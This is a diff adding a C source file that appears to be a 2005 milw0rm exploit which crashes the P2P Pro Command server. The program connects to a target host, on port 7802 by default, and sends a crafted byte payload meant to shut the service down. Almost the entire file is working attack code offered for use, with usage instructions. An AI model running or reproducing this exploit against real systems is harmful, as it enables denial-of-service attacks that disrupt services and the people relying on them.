@@ -1,0 +1,98 @@
+/*
+     P2P Pro Command DOS Exploit
+ ------------------------------------
+  Infam0us Gr0up - Securiti Research
+
+ Info: infamous.2hell.com
+ Vendor URL: http://www.digital-revolution.org/P2PPro.html
+
+*/
+
+#include string.h
+#include winsock2.h 
+#include stdio.h 
+
+#pragma comment(lib, "ws2_32.lib") 
+
+char doscore[] = 
+"\x3f\x3f\xbc\x59\x70 "
+"\x32\x70\x3f\xe1 "
+"\x2b\x5c\x3f\xa6\xeb\xa6"
+"\x50\x46\x2b\x5c\x3f\xa6\xeb\xa6"
+"\x50\x4f\x57\x4e\x45\x44\x2e\x74"
+"\x78\x74\x2b\x5c\x3f\xa6\xeb\xa6"
+"\x50\x31\x32\x33\x32\x34\x32\x2e\x6b\x62";
+
+
+int main(int argc, char *argv[]) 
+{ 
+WSADATA wsaData; 
+WORD wVersionRequested; 
+struct hostent *pTarget; 
+struct sockaddr_in sock; 
+char *target; 
+int port,bufsize; 
+SOCKET inetdos; 
+
+if (argc < 2) 
+{ 
+printf("        P2P Pro Command DOS Exploit \n", argv[0]);
+printf("  --------------------------------------\n", argv[0]);
+printf("    Infam0us Gr0up - Securiti Research\n\n", argv[0]);
+printf("[-]Usage: %s [target] [port]\n", argv[0]); 
+printf("[?]Exam: %s localhost 7802\n", argv[0]); 
+exit(1); 
+} 
+
+wVersionRequested = MAKEWORD(1, 1); 
+if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1; 
+
+target = argv[1]; 
+port = 7802; 
+
+if (argc >= 3) port = atoi(argv[2]); 
+bufsize = 1024; 
+if (argc >= 4) bufsize = atoi(argv[3]); 
+
+inetdos = socket(AF_INET, SOCK_STREAM, 0); 
+if(inetdos==INVALID_SOCKET) 
+{ 
+printf("Socket ERROR \n"); 
+exit(1); 
+} 
+printf("    P2P Pro Command DOS Exploit \n", argv[0]);
+printf("  --------------------------------------\r\n\n", argv[0]);
+printf("Resolve host... "); 
+if ((pTarget = gethostbyname(target)) == NULL) 
+{ 
+printf("FAILED \n", argv[0]); 
+exit(1); 
+} 
+printf("[OK]\n ");
+memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length); 
+sock.sin_family = AF_INET; 
+sock.sin_port = htons((USHORT)port); 
+
+printf("[+] Connecting... "); 
+if ( (connect(inetdos, (struct sockaddr *)&sock, sizeof (sock) ))) 
+{ 
+printf("FAILED\n"); 
+exit(1); 
+} 
+printf("[OK]\n");
+printf("Target listen.. \n"); 
+printf("Sending bad procedure... "); 
+if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1) 
+{ 
+printf("ERROR\n"); 
+closesocket(inetdos); 
+exit(1); 
+} 
+printf("[OK]\n ");
+printf("[+] Server SHUTDOWNED!\n"); 
+closesocket(inetdos); 
+WSACleanup(); 
+return 0; 
+}
+
+// milw0rm.com [2005-09-02]
